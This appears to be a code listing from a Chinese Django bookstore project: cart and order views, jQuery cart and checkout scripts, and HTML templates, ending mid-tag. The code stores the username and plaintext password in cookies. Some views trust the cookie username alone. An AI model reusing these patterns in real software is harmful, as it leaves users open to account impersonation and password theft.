user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) sum_price = 0 if req: id = TUser.objects.get(user_name=user_name) # 用户id car = TCar.objects.filter(user_id=id) with transaction.atomic(): address = TAddress.objects.filter(user_id=id) for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return render(request, &quot;car/indent.html&quot;, &#123;&quot;address&quot;: address, &quot;car&quot;: car, &quot;sum_price&quot;: sum_price, &quot;user_name&quot;: user_name&#125;) return redirect(&quot;user:login&quot;)def order_ok(request): user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) id = TUser.objects.get(user_name=user_name) # 用户id car = TCar.objects.filter(user_id=id) # 用户的car sum_price = 0 # 总计 # 获取到提交订单的地址 address = request.GET.get(&quot;address&quot;) address_id = TAddress.objects.filter(address=address)[0] # 生成订单号 order_id = str(time.strftime(&#x27;%Y%m%d%H%M%S&#x27;, time.localtime(time.time()))) + str(time.time()).replace(&#x27;.&#x27;, &#x27;&#x27;)[-7:] create_time = datetime.datetime.now().strftime(&#x27;%Y-%m-%d&#x27;) # 订单项 for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) with transaction.atomic(): order = TOrder.objects.create(order_id=order_id, create_time=create_time, price=sum_price, address_id=address_id.id, user_id=id.id) count = 0 for i in car: with transaction.atomic(): order_item = TOrderItem.objects.create(count=i.count, book_id=i.id, order_id=order.id) count += i.count i.delete() return render(request, &#x27;car/indent ok.html&#x27;, &#123;&quot;user_name&quot;: user_name, &quot;order&quot;: order, &quot;count&quot;: count, &quot;order_item&quot;: order_item, &quot;address&quot;: address_id&#125;)def order_submit(request): user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) id = TUser.objects.get(user_name=user_name) # 用户 t_address = TAddress.objects.filter(user_id=id) # 用户的地址 ship_man = request.POST.get(&quot;ship_man&quot;) address = request.POST.get(&quot;address&quot;) addr_mobile = request.POST.get(&quot;addr_mobile&quot;) cellphone = request.POST.get(&quot;cellphone&quot;) post = request.POST.get(&quot;post&quot;) print(ship_man, address, addr_mobile, cellphone, post) # 判断地址是否存在,不存在添加 if t_address[0].address == address: return JsonResponse(&#123;&quot;msg&quot;: &quot;地址已经存在&quot;, &quot;error&quot;: 1&#125;) else: TAddress.objects.create(address=address, name=ship_man, post_code=post, cellphone=cellphone, addr_mobile=addr_mobile, user_id=id.id) return JsonResponse(&#123;&quot;msg&quot;: &quot;订单生成&quot;, &quot;error&quot;: 0&#125;) car.Javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;script type=&quot;text/javascript&quot;&gt; $(function () &#123; &#123;#修改数量以及价格#&#125; $(&quot;.num_del&quot;).click(function () &#123; var num1 = $(this).next().val(); var num2 = Number(num1) - 1; if (num2 == 0)&#123; alert(&quot;商品个数不能再减了!&quot;) &#125;else &#123; $(this).next().val(num2); var price2 = $(this).parent().parent().prev().text(); var count = Number(price2) * num2; $(this).parent().parent().next().text(count.toFixed(2)) //修改小计 $.ajax(&#123; type:&quot;get&quot;, url:&quot;&#123;% url &#x27;car:add_car&#x27; %&#125;&quot;, data: &quot;bookid=&quot;+$(this).next().attr(&#x27;id1&#x27;)+&quot;&amp;booknum=&quot;+(-1), success: function (msg) &#123; $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125; &#125;) &#125; &#125;); $(&quot;.num_add&quot;).click(function () &#123; var num1 = $(this).prev().val(); var num2 = Number(num1) + 1; $(this).prev().val(num2); var price2 = $(this).parent().parent().prev().text(); var count = Number(price2) * num2; $(this).parent().parent().next().text(count.toFixed(2)); $.ajax(&#123; type:&quot;get&quot;, url:&quot;&#123;% url &#x27;car:add_car&#x27; %&#125;&quot;, data: &quot;bookid=&quot;+$(this).prev().attr(&#x27;id1&#x27;)+&quot;&amp;booknum=&quot;+1, success: function (msg) &#123; $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125; &#125;) &#125;); &#123;#删除产品#&#125; $(&quot;.delete&quot;).click(function () &#123; var td = $(this).parent().parent().parent(); $.ajax(&#123; type: &quot;get&quot;, url: &quot;&#123;% url &#x27;car:rem_book&#x27; %&#125;&quot;, data: &quot;id=&quot;+$(this).attr(&#x27;value&#x27;), success: function (msg) &#123; console.log(msg); if (msg.error == 0)&#123; alert(msg.msg); td.remove(); $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125;else&#123; td.remove(); $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); alert(&quot;删除失败!&quot;) &#125; &#125; &#125;) &#125;); &#123;# 输入框失焦 #&#125; $(&quot;.book_num&quot;).blur(function () &#123; var booknum= $(this).val(); var price = $(this).parent().parent().prev().text(); var totalprice = $(this).parent().parent().next().text(); console.log(totalprice); totalprice = Number(booknum)* Number(price); $(this).parent().parent().next().text(totalprice.toFixed(2)); if (booknum == parseInt(booknum) &amp;&amp; booknum &gt; 0)&#123; $.ajax(&#123; type: &quot;get&quot;, url: &quot;&#123;% url &#x27;car:add_car&#x27; %&#125;&quot;, data: &quot;booknum1=&quot;+$(this).val() + &quot;&amp;bookid=&quot;+$(this).attr(&#x27;id1&#x27;), success: function (msg)&#123; console.log(msg); $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125; &#125;) &#125;else &#123; alert(&quot;输入数据不合法&quot;) &#125; &#125;); &#123;# 登陆跳转 #&#125; $(&quot;.login_link&quot;).click(function () &#123; var url = location.href; console.log(url); location.href= &quot;&#123;% url &#x27;user:login&#x27; %&#125;?url=&quot;+url; &#125;); &#123;# 注册跳转 #&#125; $(&quot;#regist&quot;).click(function () &#123; var url = location.href; console.log(url); location.href = &quot;&#123;% url &#x27;user:regist&#x27; %&#125;?url=&quot;+url; &#125;); &#123;# 退出 #&#125; $(&quot;#exit&quot;).click(function () &#123; var url = location.href; $.ajax(&#123; type: &#x27;get&#x27;, url: &quot;&#123;% url &#x27;user:exit&#x27; %&#125;&quot;, data: &quot;username=&quot;+$(this).attr(&#x27;name&#x27;), success: function (msg) &#123; console.log(msg); if (msg.error==0)&#123; alert(msg.msg); location.href = &quot;&#123;% url &#x27;car:car&#x27; %&#125;&quot; $(&quot;.login_link&quot;)[0].innerHTML =&#x27; &lt;a class=&quot;login_link&quot; href=&quot;#&quot; &gt;登录&lt;/a&gt;&#x27; &#125;else &#123; alert(&quot;发生错误&quot;) &#125; &#125; &#125;) &#125;); &#125;); &lt;/script&gt; car.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt; &#123;% if user_name %&#125; &#123;% for foo in car %&#125; &lt;tbody data-stock=&quot;22388&quot; data-offline=&quot;false&quot; data-productid=&quot;24147882&quot; data-timestamp=&quot;1484488454000&quot; data-orderforspupormo=&quot;0&quot;&gt; &lt;tr id=&quot;tr_424893864&quot; class=&quot; &quot;&gt; &lt;td class=&quot;row1&quot;&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-product-check checknow check_on&quot;&gt;选中&lt;/a&gt; &lt;/td&gt; &lt;td class=&quot;row_img&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.book.id &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot;&gt; &lt;img onmouseout=&quot;$(this).parent().next().hide()&quot; onmouseover=&quot;$(this).parent().next().show()&quot; src=&quot;/static/book_pic/&#123;&#123; foo.book.picture &#125;&#125;&quot; width=&quot;80&quot; height=&quot;80&quot;&gt; &lt;/a&gt; &lt;div style=&quot;display: none;&quot; class=&quot;img_big&quot;&gt;&lt;a href=&quot;/static/book_pic/&#123;&#123; foo.book.picture &#125;&#125;&quot; dd_name=&quot;查看详情&quot; target=&quot;_blank&quot;&gt; &lt;img src=&quot;/static/book_pic/&#123;&#123; foo.book.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;span class=&quot;arrow&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row_name&quot;&gt; &lt;div class=&quot;name&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.book.id &#125;&#125;&quot; title=&quot;&#123;&#123; foo.book.name &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot; style=&quot;word-break:break-all; word-wrap:break-word;&quot;&gt;&#123;&#123; foo.book.book_name &#125;&#125;&lt;/a&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row3&quot;&gt;&lt;span id=&quot;price1&quot;&gt;&#123;&#123; foo.book.new_price &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td data-minbuy=&quot;0&quot; class=&quot;fn-count-tip row3 &quot;&gt; &lt;span class=&quot;amount fn-updatecount &quot; data-value=&quot;1&quot;&gt; &lt;a class=&quot;num_del&quot; dd_name=&quot;减少数量&quot; href=&quot;javascript:void(0)&quot; &gt;-&lt;/a&gt; &lt;input id1=&quot;&#123;&#123; foo.book.id &#125;&#125;&quot; class=&quot;book_num&quot; data-value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; type=&quot;text&quot;&gt; &lt;a class=&quot;num_add&quot; dd_name=&quot;增加数量&quot; href=&quot;javascript:void(0)&quot; &gt;+&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row4&quot;&gt;&lt;span class=&quot;red&quot; class=&quot;price2&quot;&gt;&#123;&#123; foo.totalprice &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row5 &quot;&gt; &lt;span&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-add-wish&quot; dd_name=&quot;加入收藏按钮&quot;&gt;移入收藏&lt;/a&gt; &lt;/span&gt; &lt;span&gt; &lt;a value =&quot;&#123;&#123; foo.book.id &#125;&#125;&quot; class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-remove-product&quot; dd_name=&quot;删除普通品&quot;&gt;删除&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt; &#123;% endfor %&#125; &#123;% else %&#125; &#123;% for foo in car %&#125; &lt;tbody data-stock=&quot;22388&quot; data-offline=&quot;false&quot; data-productid=&quot;24147882&quot; data-timestamp=&quot;1484488454000&quot; data-orderforspupormo=&quot;0&quot;&gt; &lt;tr id=&quot;tr_424893864&quot; class=&quot; &quot;&gt; &lt;td class=&quot;row1&quot;&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-product-check checknow check_on&quot;&gt;选中&lt;/a&gt; &lt;/td&gt; &lt;td class=&quot;row_img&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.id &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot;&gt; &lt;img onmouseout=&quot;$(this).parent().next().hide()&quot; onmouseover=&quot;$(this).parent().next().show()&quot; src=&quot;/static/book_pic/&#123;&#123; foo.picture &#125;&#125;&quot; width=&quot;80&quot; height=&quot;80&quot;&gt; &lt;/a&gt; &lt;div style=&quot;display: none;&quot; class=&quot;img_big&quot;&gt;&lt;a href=&quot;/static/book_pic/&#123;&#123; foo.picture &#125;&#125;&quot; dd_name=&quot;查看详情&quot; target=&quot;_blank&quot;&gt; &lt;img src=&quot;/static/book_pic/&#123;&#123; foo.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;span class=&quot;arrow&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row_name&quot;&gt; &lt;div class=&quot;name&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.id &#125;&#125;&quot; title=&quot;&#123;&#123; foo.name &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot; style=&quot;word-break:break-all; word-wrap:break-word;&quot;&gt;&#123;&#123; foo.book_name &#125;&#125;&lt;/a&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row3&quot;&gt;&lt;span id=&quot;price1&quot;&gt;&#123;&#123; foo.new_price &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td data-minbuy=&quot;0&quot; class=&quot;fn-count-tip row3 &quot;&gt; &lt;span class=&quot;amount fn-updatecount &quot; data-value=&quot;1&quot;&gt; &lt;a class=&quot;num_del&quot; dd_name=&quot;减少数量&quot; href=&quot;javascript:void(0)&quot; &gt;-&lt;/a&gt; &lt;input id1=&quot;&#123;&#123; foo.id &#125;&#125;&quot; class=&quot;book_num&quot; data-value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; type=&quot;text&quot;&gt; &lt;a class=&quot;num_add&quot; dd_name=&quot;增加数量&quot; href=&quot;javascript:void(0)&quot; &gt;+&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row4&quot;&gt;&lt;span class=&quot;red&quot; class=&quot;price2&quot;&gt;&#123;&#123; foo.totalprice &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row5 &quot;&gt; &lt;span&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-add-wish&quot; dd_name=&quot;加入收藏按钮&quot;&gt;移入收藏&lt;/a&gt; &lt;/span&gt; &lt;span&gt; &lt;a value =&quot;&#123;&#123; foo.id &#125;&#125;&quot; class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-remove-product&quot; dd_name=&quot;删除普通品&quot;&gt;删除&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt; &#123;% endfor %&#125; &#123;% endif %&#125; &lt;tfoot&gt; &lt;tr class=&quot;total&quot;&gt; &lt;td class=&quot;row1&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td class=&quot;row_img&quot;&gt;店铺合计&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td colspan=&quot;3&quot; class=&quot;row4&quot;&gt; &lt;span id=&quot;count&quot;class=&quot;red big ooline alignright&quot;&gt;¥&#123;&#123; sum_price &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/tfoot&gt;&lt;/table&gt; indent.Javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156&lt;script type=&quot;text/javascript&quot;&gt; $(function () &#123; var ship_man = $(&quot;#ship_man&quot;).val(); var addr_mobile = $(&quot;#phone&quot;).val(); var cellphone = $(&quot;#cellphone&quot;).val(); var post = $(&quot;#post&quot;).val(); var address = $(&quot;#address&quot;).val(); &#123;# 退出 #&#125; $(&quot;#exit&quot;).click(function () &#123; $.ajax(&#123; type: &#x27;get&#x27;, url: &quot;&#123;% url &#x27;user:exit&#x27; %&#125;&quot;, data: &quot;username=&quot;+$(this).attr(&#x27;name&#x27;), success: function (msg) &#123; console.log(msg); if (msg.error==0)&#123; alert(msg.msg); location.href = &quot;&#123;% url &#x27;index:index&#x27; %&#125;&quot; &#125;else &#123; alert(msg.msg) &#125; &#125; &#125;) &#125;); &#123;# 收货人校验 #&#125; $(&quot;#ship_man&quot;).blur(function () &#123; f4() &#125;); function f4() &#123; var ship_man = $(&quot;#ship_man&quot;).val(); console.log(ship_man); if (ship_man == &#x27;&#x27;)&#123; $(&quot;#spn_ship_man&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;) return false &#125;else &#123; $(&quot;#spn_ship_man&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;) return true &#125; &#125; &#123;# 详细地址校验 #&#125; $(&quot;#address&quot;).blur(function () &#123; f3() &#125;); function f3() &#123; var address = $(&quot;#address&quot;).val(); var patrn = /.*省(.+)市.*/; if (patrn.test(address))&#123; console.log(&quot;地址格式正确!&quot;); $(&quot;#spn_ship_address&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); return true &#125; else &#123; $(&quot;#spn_ship_address&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 邮箱校验 #&#125; $(&quot;#post&quot;).blur(function () &#123; f2() &#125;); function f2() &#123; var patrn = /^[a-zA-Z0-9 ]&#123;3,12&#125;$/; var post = $(&quot;#post&quot;).val(); if (patrn.test(post)) &#123; console.log(&quot;邮政编码正确&quot;); $(&quot;#spn_ship_post&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;) return true &#125;else &#123; $(&quot;#spn_ship_address&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 手机校验 #&#125; $(&quot;#cellphone&quot;).blur(function () &#123; f1() &#125;); function f1() &#123; var patrn = /^1[34578]\\d&#123;9&#125;$/; var cellphone = $(&quot;#cellphone&quot;).val(); var phone = $(&quot;#phone&quot;).val(); if (patrn.test(cellphone))&#123; console.log(&quot;手机号输入正确!&quot;); $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); return true &#125; else &#123; console.log(&quot;手机号输入错误!&quot;); $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 固定电话校验 #&#125; $(&quot;#addr_mobile&quot;).blur(function () &#123; f(); &#125;); function f() &#123; var patrn = /^(\\+\\d&#123;1,3&#125;)(\\s&#123;1&#125;[1-9]\\d&#123;1,2&#125;\\s&#123;1&#125;)(\\d&#123;7,8&#125;)$/; var addr_mobile = $(&quot;#addr_mobile&quot;).val(); if (patrn.test(addr_mobile))&#123; console.log(&quot;固定电话格式正确&quot;); $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); return true &#125; else &#123; $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 提交订单 #&#125; $(&quot;#order_sumbit&quot;).click(function () &#123; var ship_man = $(&quot;#ship_man&quot;).val(); var addr_mobile = $(&quot;#phone&quot;).val(); var cellphone = $(&quot;#cellphone&quot;).val(); var post = $(&quot;#post&quot;).val(); var address = $(&quot;#address&quot;).val(); console.log(ship_man,addr_mobile) if ((f1() &amp;&amp; f2() &amp;&amp; f3() &amp;&amp; f4()) || (f() &amp;&amp; f2() &amp;&amp; f3() &amp;&amp; f4()))&#123; console.log(1); $.ajax(&#123; type: &quot;post&quot;, url: &quot;&#123;% url &#x27;car:order_submit&#x27; %&#125;&quot;, data: &quot;ship_man=&quot;+ship_man+&quot;&amp;address=&quot;+address+&quot;&amp;addr_mobile=&quot;+addr_mobile+&quot;&amp;cellphone=&quot;+cellphone+&quot;&amp;post=&quot;+post+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; console.log(msg); if (msg.error == 0)&#123; location.href = &quot;&#123;% url &#x27;car:order_ok&#x27; %&#125;?address=&quot;+address &#125;else if (msg.error ==1) &#123; console.log(&quot;地址已经存在&quot;) location.href = &quot;&#123;% url &#x27;car:order_ok&#x27; %&#125;?address=&quot;+address &#125;else &#123; alert(&quot;产生错误!&quot;) &#125; &#125; &#125;) &#125; else &#123; alert(&quot;存在非法数据&quot;) &#125; &#125;); &#123;# 选择配送地址 #&#125; $(&#x27;#select&#x27;).change(function () &#123; var a = $(&#x27;#select option:selected&#x27;); if (a.val() !== &quot;&quot;) &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;readonly&#x27;); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[0]).val(a.attr(&#x27;name&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[1]).val(a.attr(&#x27;address&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[2]).val(a.attr(&#x27;post_code&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[3]).val(a.attr(&#x27;addr_mobile&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[4]).val(a.attr(&#x27;cell_phone&#x27;)); &#125;else &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;&#x27;); for (var i=0; i &lt; $(&#x27;input[type=&quot;text&quot;]&#x27;).size();i++) &#123; $($(&#x27;input[type=&quot;text&quot;]&#x27;)[i]).val(&quot;&quot;) &#125; &#125; &#125;) &#125;) &lt;/script&gt; indent.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;div class=&quot;address&quot; id=&quot;dp_adress&quot;&gt; &lt;span class=&quot;icon_adr&quot;&gt;&amp;nbsp;&lt;/span&gt;配送地址： &#123;% if address %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;&quot; class=&quot;select_add1&quot;&gt;请选择收货地址&lt;/option&gt; &#123;% for address1 in address %&#125; &lt;option class=&quot;select_add1&quot; value=&quot;&#123;&#123; address1.id &#125;&#125;&quot; name=&quot;&#123;&#123; address1.name &#125;&#125;&quot; address=&quot;&#123;&#123; address1.address &#125;&#125;&quot; post_code=&quot;&#123;&#123; address1.post_code &#125;&#125;&quot; cellphone=&quot;&#123;&#123; address1.cellphone &#125;&#125;&quot; addr_mobile=&quot;&#123;&#123; address1.addr_mobile &#125;&#125;&quot; class=&quot;address_select&quot;&gt;&#123;&#123; address1.address &#125;&#125;&lt;/option&gt; &#123;% endfor %&#125; &lt;/select&gt; &#123;% else %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select_add&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;请选择收货地址&quot;&gt;您还没有添加收货地址&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;/div&gt; &#123;% endif %&#125; &lt;!--&lt;a href=&quot;#&quot; class=&quot;tip&quot;&gt;&lt;/a&gt;--&gt; &lt;span class=&quot;tip_c&quot; style=&quot;display:none;&quot;&gt;针对不同配送地址，您的货物可能出现缺货或无货状态，敬请谅解。&lt;/span&gt;&lt;/div&gt;&lt;ul class=&quot;shdz_con&quot;&gt; &lt;p&gt;▪ 收货地址&lt;/p&gt; &lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;收&amp;nbsp;&amp;nbsp;货&amp;nbsp;&amp;nbsp;人：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;ship_man&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_man&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot; &gt;请填写收货人姓名&lt;/span&gt;&lt;/li&gt; &lt;li&gt; &lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;收货地区：&lt;/label&gt; &lt;select id=&quot;country_id&quot; name=&quot;country_id&quot; onfocus=&quot;check_focus(&#x27;spn_country_province_city&#x27;);&quot; onblur=&quot;check_country_province_city();&quot; onchange=&quot;set_province(this.options[this.selectedIndex].value);&quot; style=&quot;display: block;&quot;&gt;&lt;option value=&quot;9000&quot;&gt;中国&lt;/option&gt;&lt;option value=&quot;16767&quot;&gt;阿尔及利亚&lt;/option&gt;&lt;option value=&quot;11717&quot;&gt;阿根廷&lt;/option&gt;&lt;option value=&quot;16161&quot;&gt;阿联酋&lt;/option&gt;&lt;option value=&quot;12020&quot;&gt;埃及&lt;/option&gt;&lt;option value=&quot;12525&quot;&gt;爱尔兰&lt;/option&gt;&lt;option value=&quot;11919&quot;&gt;奥地利&lt;/option&gt;&lt;option value=&quot;10909&quot;&gt;澳大利亚&lt;/option&gt;&lt;option value=&quot;14747&quot;&gt;巴基斯坦&lt;/option&gt;&lt;option value=&quot;12828&quot;&gt;巴拿马&lt;/option&gt;&lt;option value=&quot;10707&quot;&gt;巴西&lt;/option&gt;&lt;option value=&quot;16868&quot;&gt;白俄罗斯&lt;/option&gt;&lt;option value=&quot;16969&quot;&gt;保加利亚&lt;/option&gt;&lt;option value=&quot;13535&quot;&gt;比利时&lt;/option&gt;&lt;option value=&quot;15656&quot;&gt;波多黎各&lt;/option&gt;&lt;option value=&quot;14949&quot;&gt;波兰&lt;/option&gt;&lt;option value=&quot;17272&quot;&gt;玻利维亚&lt;/option&gt;&lt;option value=&quot;14444&quot;&gt;丹麦&lt;/option&gt;&lt;option value=&quot;10505&quot;&gt;德国&lt;/option&gt;&lt;option value=&quot;15353&quot;&gt;俄罗斯&lt;/option&gt;&lt;option value=&quot;10404&quot;&gt;法国&lt;/option&gt;&lt;option value=&quot;12222&quot;&gt;菲律宾&lt;/option&gt;&lt;option value=&quot;12323&quot;&gt;芬兰&lt;/option&gt;&lt;option value=&quot;17474&quot;&gt;古巴&lt;/option&gt;&lt;option value=&quot;12424&quot;&gt;关岛&lt;/option&gt;&lt;option value=&quot;10808&quot;&gt;韩国&lt;/option&gt;&lt;option value=&quot;12121&quot;&gt;荷兰&lt;/option&gt;&lt;option value=&quot;11010&quot;&gt;加拿大&lt;/option&gt;&lt;option value=&quot;15151&quot;&gt;柬埔寨&lt;/option&gt;&lt;option value=&quot;11111&quot;&gt;捷克&lt;/option&gt;&lt;option value=&quot;17373&quot;&gt;喀麦隆&lt;/option&gt;&lt;option value=&quot;14848&quot;&gt;科威特&lt;/option&gt;&lt;option value=&quot;15858&quot;&gt;老挝&lt;/option&gt;&lt;option value=&quot;16262&quot;&gt;黎嫩&lt;/option&gt;&lt;option value=&quot;15959&quot;&gt;列支敦士登&lt;/option&gt;&lt;option value=&quot;16060&quot;&gt;卢森堡&lt;/option&gt;&lt;option value=&quot;17070&quot;&gt;卢旺达&lt;/option&gt;&lt;option value=&quot;13030&quot;&gt;罗马尼亚&lt;/option&gt;&lt;option value=&quot;15555&quot;&gt;马尔代夫&lt;/option&gt;&lt;option value=&quot;13636&quot;&gt;马来西亚&lt;/option&gt;&lt;option value=&quot;10101&quot;&gt;美国&lt;/option&gt;&lt;option value=&quot;14545&quot;&gt;蒙古&lt;/option&gt;&lt;option value=&quot;17171&quot;&gt;孟加拉&lt;/option&gt;&lt;option value=&quot;11818&quot;&gt;秘鲁&lt;/option&gt;&lt;option value=&quot;11212&quot;&gt;墨西哥&lt;/option&gt;&lt;option value=&quot;13232&quot;&gt;南非&lt;/option&gt;&lt;option value=&quot;16666&quot;&gt;南斯拉夫&lt;/option&gt;&lt;option value=&quot;16363&quot;&gt;尼日利亚&lt;/option&gt;&lt;option value=&quot;11313&quot;&gt;挪威&lt;/option&gt;&lt;option value=&quot;12929&quot;&gt;葡萄牙&lt;/option&gt;&lt;option value=&quot;10303&quot;&gt;日本&lt;/option&gt;&lt;option value=&quot;11414&quot;&gt;瑞典&lt;/option&gt;&lt;option value=&quot;13737&quot;&gt;瑞士&lt;/option&gt;&lt;option value=&quot;13838&quot;&gt;塞浦路斯&lt;/option&gt;&lt;option value=&quot;16464&quot;&gt;沙特阿拉伯&lt;/option&gt;&lt;option value=&quot;13333&quot;&gt;斯里兰卡&lt;/option&gt;&lt;option value=&quot;13434&quot;&gt;泰国&lt;/option&gt;&lt;option value=&quot;13939&quot;&gt;坦桑尼亚&lt;/option&gt;&lt;option value=&quot;15757&quot;&gt;土耳其&lt;/option&gt;&lt;option value=&quot;15252&quot;&gt;委内瑞拉&lt;/option&gt;&lt;option value=&quot;15050&quot;&gt;文莱&lt;/option&gt;&lt;option value=&quot;14040&quot;&gt;乌克兰&lt;/option&gt;&lt;option value=&quot;16565&quot;&gt;乌拉圭&lt;/option&gt;&lt;option value=&quot;11515&quot;&gt;西班牙&lt;/option&gt;&lt;option value=&quot;14343&quot;&gt;希腊&lt;/option&gt;&lt;option value=&quot;13131&quot;&gt;新加坡&lt;/option&gt;&lt;option value=&quot;12727&quot;&gt;新西兰&lt;/option&gt;&lt;option value=&quot;14141&quot;&gt;匈牙利&lt;/option&gt;&lt;option value=&quot;12626&quot;&gt;牙买加&lt;/option&gt;&lt;option value=&quot;11616&quot;&gt;意大利&lt;/option&gt;&lt;option value=&quot;10606&quot;&gt;印度&lt;/option&gt;&lt;option value=&quot;14646&quot;&gt;印度尼西亚&lt;/option&gt;&lt;option value=&quot;10202&quot;&gt;英国&lt;/option&gt;&lt;option value=&quot;14242&quot;&gt;越南&lt;/option&gt;&lt;option value=&quot;15454&quot;&gt;智利&lt;/option&gt;&lt;option value=&quot;19999&quot;&gt;其他国家或地区&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;province_id&quot; name=&quot;province_id&quot; 